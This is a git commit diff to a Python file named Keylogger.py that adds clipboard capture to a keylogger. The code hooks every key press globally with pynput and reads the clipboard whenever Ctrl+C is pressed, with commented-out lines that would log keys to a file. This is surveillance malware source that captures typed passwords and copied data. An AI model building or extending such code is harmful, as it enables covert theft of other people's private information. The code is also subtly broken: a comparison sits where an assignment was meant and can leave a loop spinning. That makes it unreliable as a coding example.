cc90834314741bc10cd7cbbdadd048b130944851
Christopher liang <z5492103@ad.unsw.edu.au>
2023-10-30 00:24:09 +1100

    Made it so it can read clipboard

--- Keylogger.py
+++ Keylogger.py
@@ -1,11 +1,56 @@
 from pynput import keyboard
+from win32 import win32clipboard
+import pyperclip
+import time
+import threading
 
+oldClipboard = ''
 
 def printKeyPress(key):
-        print(key)
+    print(str(key))
+    # with open("recording.txt", mode='a') as f:
+        # f.write(str(key))
+        # f.write('\n')
+        # f.close()
+
+def shortcutsPressed():
+    with open("recording.txt", mode='a') as f:
+        global oldClipboard
+
+        # win32clipboard.OpenClipboard()
+        # data = str(win32clipboard.GetClipboardData())
+        # win32clipboard.CloseClipboard()
+
+        data = pyperclip.paste()
+
+        print("asdadsad: {a}".format(a = data))
+        print("asdadsad: {a}".format(a = oldClipboard))
+        print(data == oldClipboard)
+        while (data == oldClipboard):
+            # win32clipboard.OpenClipboard()
+            # data = str(win32clipboard.GetClipboardData())
+            # win32clipboard.CloseClipboard()
+
+            data = pyperclip.paste()
+
+            oldClipboard == data
+
+        print(data)
+        print(oldClipboard)
+
+def readKeyboardInput():
+    global oldClipboard
+    with keyboard.Listener(on_press=printKeyPress) as listener:
+        listener.join()
+
+def readClipboard():
+    global oldClipboard
+    with keyboard.GlobalHotKeys({'<ctrl>+c' : shortcutsPressed}) as h:
+        h.join()
+    # hotkey = keyboard.HotKey(keyboard.HotKey.parse('<ctrl>+c'), shortcutsPressed)
+    
+
+threading.Thread(target = readKeyboardInput, name ='keyboardReader', daemon= False).start()
+threading.Thread(target = readClipboard, name = 'clipboardReader', daemon= True).start()
 
 
-
-if __name__ == '__main__':
-        with keyboard.Listener(on_press=printKeyPress) as listener:
-                listener.join()
